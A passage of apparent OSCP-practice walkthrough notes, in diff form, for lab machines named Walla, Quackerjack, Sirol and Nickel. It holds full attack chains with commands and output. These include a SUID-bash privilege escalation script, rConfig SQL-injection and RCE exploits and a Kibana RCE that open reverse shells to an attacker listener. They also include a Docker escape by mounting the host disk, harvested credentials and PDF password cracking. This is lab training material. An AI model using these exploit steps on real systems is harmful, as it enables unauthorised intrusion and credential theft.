+> import os
+> import sys
+> try:
+>         os.system('chmod u+s /usr/bin/bash')
+> except:
+>         print 'ERROR...'
+> 
+sys.exit(0)
+> EOT
+EOT
+```
+
+6. Rooted 'bash -p'
+
+## Walla 
+1. Port scan
+```
+ nmap -A -T4 -p 22,23,25,53,422,8091,42042 192.168.200.97 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 02:50 EDT
+Nmap scan report for 192.168.200.97
+Host is up (0.098s latency).
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
+|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
+|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
+23/tcp    open  telnet     Linux telnetd
+25/tcp    open  smtp       Postfix smtpd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=walla
+| Subject Alternative Name: DNS:walla
+| Not valid before: 2020-09-17T18:26:36
+|_Not valid after:  2030-09-15T18:26:36
+|_smtp-commands: walla, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCMIME, DSN, SMTPUTF8, CHUNKING
+53/tcp    open  tcpwrapped
+422/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
+|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
+|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
+8091/tcp  open  http       lighttpd 1.4.53
+|_http-server-header: lighttpd/1.4.53
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=RaspAP
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+42042/tcp open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 02:71:5d:c8:b9:43:ba:6a:c8:ed:15:c5:6c:b2:f5:f9 (RSA)
+|   256 f3:e5:10:d4:16:a9:9e:03:47:38:ba:ac:18:24:53:28 (ECDSA)
+|_  256 02:4f:99:ec:85:6d:79:43:88:b2:b5:7c:f0:91:fe:74 (ED25519)
+Service Info: Host:  walla; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Found default credentials for raspap 'admin:secret'. Found terminal (console) at system. Use it to get reverse shell. 
+
+3. Obtained foothold. User have sudo python permission on some files. 
+```
+www-data@walla:/home/walter$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on walla:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/us
+
+User www-data may run the following commands on walla:
+    (ALL) NOPASSWD: /sbin/ifup
+    (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
+    (ALL) NOPASSWD: /bin/systemctl start hostapd.service
+    (ALL) NOPASSWD: /bin/systemctl stop hostapd.service
+    (ALL) NOPASSWD: /bin/systemctl start dnsmasq.service
+    (ALL) NOPASSWD: /bin/systemctl stop dnsmasq.service
+    (ALL) NOPASSWD: /bin/systemctl restart dnsmasq.service
+```
+
+4. Change 'wifi_reset.py' with Gitfobin SUDO command. Obtained root. 
+```
+www-data@walla:/home/walter$ sudo /usr/bin/python /home/walter/wifi_reset.py
+sudo /usr/bin/python /home/walter/wifi_reset.py
+www-data@walla:/home/walter$ bash -p
+bash -p
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+cd /root
+cat proof.txt
+a32fb08139aa1d54a96cf2c484ddeb4a
+```
+
+## Quackerjack
+1. Port scan
+```
+PORT     STATE SERVICE         REASON
+21/tcp   open  ftp             syn-ack
+22/tcp   open  ssh             syn-ack
+80/tcp   open  http            syn-ack
+111/tcp  open  rpcbind         syn-ack
+139/tcp  open  netbios-ssn     syn-ack
+445/tcp  open  microsoft-ds    syn-ack
+3306/tcp open  mysql           syn-ack
+8081/tcp open  blackice-icecap syn-ack
+```
+
+2. Found a webpage - https://quackerjack:8081/
+
+3. Found a exploit which helps for sql query for user creds. 
+```
+rConfig 3.9 - 'searchColumn' SQL Injection
+
+python3 48208.py https://quackerjack:8081/  
+
+admin:1:dc40b85276a1f4d7cb35f154236aa1b2
+
+admin:abgrtyu
+```
+
+4. Use authenticated RCE exploit. 
+```
+rConfig 3.9.4 - 'search.crud.php' Remote Command Injection
+
+python3 48241.py https://quackerjack:8081/ admin abgrtyu 192.168.45.156 80   
+
+nc -nlvp 80
+listening on [any] 80 ...
+connect to [192.168.45.156] from (UNKNOWN) [192.168.200.57] 34740
+bash: no job control in this shell
+bash-4.2$ id
+id
+uid=48(apache) gid=48(apache) groups=48(apache)
+```
+
+5. Rooted with find SUID. 
+
+## Sirol
+1. Port scan
+```
+PORT      STATE SERVICE   VERSION
+22/tcp    open  ssh       OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 cd:88:cb:33:78:9a:bf:f0:31:57:d9:2f:ae:13:ee:db (RSA)
+|   256 fb:54:3b:ba:f6:68:57:81:e4:65:6e:24:9c:db:6d:8a (ECDSA)
+|_  256 be:6e:25:d1:88:09:7e:33:40:b3:56:6a:b4:ce:16:0d (ED25519)
+80/tcp    open  http      Apache httpd 2.4.25 ((Debian))
+|_http-title: PHP Calculator
+|_http-server-header: Apache/2.4.25 (Debian)
+3306/tcp  open  mysql     MariaDB (unauthorized)
+5601/tcp  open  esmagent?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
+|     HTTP/1.1 400 Bad Request
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     kbn-name: kibana
+|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
+|     content-type: application/json; charset=utf-8
+|     cache-control: no-cache
+|     content-length: 60
+|     connection: close
+|     Date: Fri, 17 May 2024 10:24:02 GMT
+|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
+|   GetRequest: 
+|     HTTP/1.1 302 Found
+|     location: /app/kibana
+|     kbn-name: kibana
+|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
+|     cache-control: no-cache
+|     content-length: 0
+|     connection: close
+|     Date: Fri, 17 May 2024 10:23:59 GMT
+|   HTTPOptions: 
+|     HTTP/1.1 404 Not Found
+|     kbn-name: kibana
+|     kbn-xpack-sig: 79b8a7336823018e37a1e121a9f3bb67
+|     content-type: application/json; charset=utf-8
+|     cache-control: no-cache
+|     content-length: 38
+|     connection: close
+|     Date: Fri, 17 May 2024 10:23:59 GMT
+|_    {"statusCode":404,"error":"Not Found"}
+24007/tcp open  rpcbind
+```
+
+2. Found kibana exploit and obtained foothold. 
+```
+python2 CVE-2019-7609-kibana-rce.py -u http://192.168.200.54:5601/ -host 192.168.45.156 -port 1234 --shell
+
+nc -nlvp 1234   
+listening on [any] 1234 ...
+connect to [192.168.45.156] from (UNKNOWN) [192.168.200.54] 53266
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@0873e8062560:/# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+3. Found local.txt. Figured out we at docker so, mounting file to read proof.txt
+```
+root@0873e8062560:/# mkdir /mnt/own
+mkdir /mnt/own
+root@0873e8062560:/# mount /dev/sda1 /mnt/own
+
+root@0873e8062560:/mnt/own/root# cat proof.txt
+cat proof.txt
+0d905e33ae5cad110119ca5c345172ab
+```
+
+4. We can mount new ssh file under root to ssh and root, so that we can direct access to machine which is not in docker. 
+
+## Nickel
+1. Port scan 
+```
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           FileZilla ftpd
+| ftp-syst: 
+|_  SYST: UNIX emulated by FileZilla
+22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 86:84:fd:d5:43:27:05:cf:a7:f2:e9:e2:75:70:d5:f3 (RSA)
+|   256 9c:93:cf:48:a9:4e:70:f4:60:de:e1:a9:c2:c0:b6:ff (ECDSA)
+|_  256 00:4e:d7:3b:0f:9f:e3:74:4d:04:99:0b:b1:8b:de:a5 (ED25519)
+80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Site doesn't have a title.
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2024-05-17T11:01:48+00:00; +1s from scanner time.
+| ssl-cert: Subject: commonName=nickel
+| Not valid before: 2024-03-22T08:59:47
+|_Not valid after:  2024-09-21T08:59:47
+| rdp-ntlm-info: 
+|   Target_Name: NICKEL
+|   NetBIOS_Domain_Name: NICKEL
+|   NetBIOS_Computer_Name: NICKEL
+|   DNS_Domain_Name: nickel
+|   DNS_Computer_Name: nickel
+|   Product_Version: 10.0.18362
+|_  System_Time: 2024-05-17T11:00:37+00:00
+5040/tcp  open  unknown
+7680/tcp  open  pando-pub?
+8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn't have a title.
+33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Site doesn't have a title.
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+```
+
+2. Follow up redirect link with burp. Found creds. 
+```
+curl -X POST http://nickel:33333/list-running-procs -H 'COntent-Length: 0'
+
+commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
+              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
+```
+
+3. SSH login. Found local.txt
+```
+ssh ariah@192.168.200.99                               
+ariah@192.168.200.99's password:
+```
+
+4. Found pdf file and crack it. 
+```
+──(kali㉿kali)-[~/OSCP/pg/practice]
+└─$ pdf2john Infrastructure.pdf > pdfhash
+                                                                                                 
+┌──(kali㉿kali)-[~/OSCP/pg/practice]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pdfhash 
+ariah4168        (Infrastructure.pdf) 
+```
+
+5. Found port 80 running http so, use it to root. 
+```
+PS C:\Users\ariah> $Resp = Invoke-WebRequest 'http://localhost/?whoami' -UseBasicParsing   
+PS C:\Users\ariah> $Resp.RawContent
+
+PS C:\Users\ariah> net localgroup Administrators
+
+ssh login and check proof.txt
+```
